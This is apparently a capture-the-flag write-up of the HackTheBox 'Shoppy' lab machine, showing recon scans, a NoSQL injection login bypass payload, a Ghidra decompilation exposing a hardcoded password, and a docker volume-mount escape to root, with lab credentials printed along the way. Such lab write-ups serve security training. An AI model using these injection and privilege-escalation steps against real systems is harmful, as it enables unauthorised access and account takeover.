# Shoppy

<figure><img src="../../../.gitbook/assets/image (66).png" alt=""><figcaption><p>nice box tbh</p></figcaption></figure>



## Recon

### nmap scan

```bash
└─➜ cat ports.scan                                                                                                                                                                        [0]
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-04 17:39 IST
Stats: 0:00:19 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.30% done; ETC: 17:40 (0:00:00 remaining)
Stats: 0:00:32 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 93.75% done; ETC: 17:40 (0:00:00 remaining)
Nmap scan report for shoppy.htb (10.129.227.233)
Host is up (0.42s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-title:             Shoppy Wait Page
|_http-server-header: nginx/1.23.1
9093/tcp open        copycat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.29 seconds
```



### directory scanning

* I found few directories `/admin` & `/login` were intresting&#x20;
* `/admin` was redirecting to `/login`

### subdomain scan

```bash
ffuf -u http://shoppy.htb -H "Host: FUZZ.shoppy.htb" \
-w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt  \
-fs 169    
```

* found `mattermost`
* Adding `mattermost.shoppy.htb` in `/etc/hosts`

## Initial FootHold

### Web attack

* Mattermost index page had login page, tried sqli, didnt' work.
* Tried nosqli paylaod, worked!!

<figure><img src="../../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

* payload :&#x20;

```javascript
{
    "username": "admin' || 'a'=='a",
    "password": "password"
}
```

* Read similar payloads from hacktricks

{% embed url="https://book.hacktricks.xyz/pentesting-web/nosql-injection" %}

#### Admin access (shoppy.htb)

* After getting admin, we can see a feature called `search-users`
* i tried with same payload eariler, and it worked ( `admin' || 'a'=='a` )

<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

* the admin has wasn't crackable
* password for josh was `remembermethisway`

#### Login josh on subdomain

* After login, we can see some private/public chats
* upon visiting [http://mattermost.shoppy.htb/shoppy/channels/deploy-machine](http://mattermost.shoppy.htb/shoppy/channels/deploy-machine), we can ssh creds for user jaeger



## User shell (jaeger)

<figure><img src="../../../.gitbook/assets/image (70).png" alt=""><figcaption><p>Sh0ppyBest@pp!</p></figcaption></figure>

### Decompilng Binary&#x20;

```bash
jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger:
Sorry, try again.
[sudo] password for jaeger:
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
jaeger@shoppy:~$

```

* we can run password-manager as deploy

#### Decompiling the binary with ghidra

* main function

```cpp
bool main(void)

{
  int iVar1;
  basic_ostream *pbVar2;
  basic_string<> local_68 [32];
  basic_string local_48 [47];
  allocator<char> local_19 [9];
  
  pbVar2 = std::operator<<((basic_ostream *)std::cout,"Welcome to Josh password manager!");
  std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar2,std::endl<>);
  std::operator<<((basic_ostream *)std::cout,"Please enter your master password: ");
  std::__cxx11::basic_string<>::basic_string();
                    /* try { // try from 00101263 to 00101267 has its CatchHandler @ 001013cb */
  std::operator>>((basic_istream *)std::cin,local_48);
  std::allocator<char>::allocator();
                    /* try { // try from 00101286 to 0010128a has its CatchHandler @ 001013a9 */
  std::__cxx11::basic_string<>::basic_string((char *)local_68,(allocator *)&DAT_0010205c);
  std::allocator<char>::~allocator(local_19);
                    /* try { // try from 001012a5 to 00101387 has its CatchHandler @ 001013ba */
  std::__cxx11::basic_string<>::operator+=(local_68,"S");
  std::__cxx11::basic_string<>::operator+=(local_68,"a");
  std::__cxx11::basic_string<>::operator+=(local_68,"m");
  std::__cxx11::basic_string<>::operator+=(local_68,"p");
  std::__cxx11::basic_string<>::operator+=(local_68,"l");
  std::__cxx11::basic_string<>::operator+=(local_68,"e");
  iVar1 = std::__cxx11::basic_string<>::compare(local_48);
  if (iVar1 != 0) {
    pbVar2 = std::operator<<((basic_ostream *)std::cout,
                             "Access denied! This incident will be reported !");
    std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar2,std::endl<>);
  }
  else {
    pbVar2 = std::operator<<((basic_ostream *)std::cout,"Access granted! Here is creds !");
    std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar2,std::endl<>);
    system("cat /home/deploy/creds.txt");
  }
  
  <<snipped>>
```

* it's checking the input with word `Sample`

```cpp
iVar1 = std::__cxx11::basic_string<>::compare(local_48);
  if (iVar1 != 0) {
    pbVar2 = std::operator<<((basic_ostream *)std::cout,
                             "Access denied! This incident will be reported !");
    std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar2,std::endl<>);
```

* if it's satisfied we can read creds.txt file



### Priv Esc (jaeger -> deploy)

```bash
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```



## Root Shell

* we had a docker image , searching docker on GTFObins, we get a payload.
* Using that payload get us root shell

```bash
deploy@shoppy:~$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED         SIZE
alpine       latest    d7d3d98c851f   17 months ago   5.53MB

deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# cat /root/root.txt
b9402724d139<<snipped>>
#
```
